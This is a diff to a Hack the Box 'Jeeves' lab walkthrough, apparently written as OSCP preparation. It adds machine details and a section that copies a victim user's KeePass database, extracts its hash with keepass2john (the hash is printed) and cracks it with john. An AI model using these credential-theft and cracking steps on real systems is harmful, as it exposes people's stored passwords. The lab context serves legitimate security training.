@@ -1,7 +1,9 @@
 # Hack the Box - Jeeves
 
 ```CSS
-Machine IP: 10.10.10.63
+Machine IP: 10.10.10.63 - Windows
+Difficulty: Medium
+Category: OSCP Preparation
 ```
 
 ## NMAP
@@ -179,6 +181,17 @@ PS C:\Users\kohsuke\Documents> cd HardyBoy:
 ![image](https://user-images.githubusercontent.com/83878909/236418624-4a8aa8da-1174-4551-8c62-5a4ffb6dd317.png)
 
 ```CSS
-▶ cp C:\Users\kohsuke\Documents\CEH.kdbx
+PS HardyBoy:\> cp C:\Users\kohsuke\Documents\CEH.kdbx
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236419375-2e1c8a97-5752-4594-bdf7-9d012466a04f.png)
+
+### Crack KeePass Database Password
+```CSS
+▶ keepass2john CEH.kdbx
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+```
+
+```CSS
+▶ keepass2john CEH.kdbx > kdbx.hash
+▶ john kdbx.hash
+```
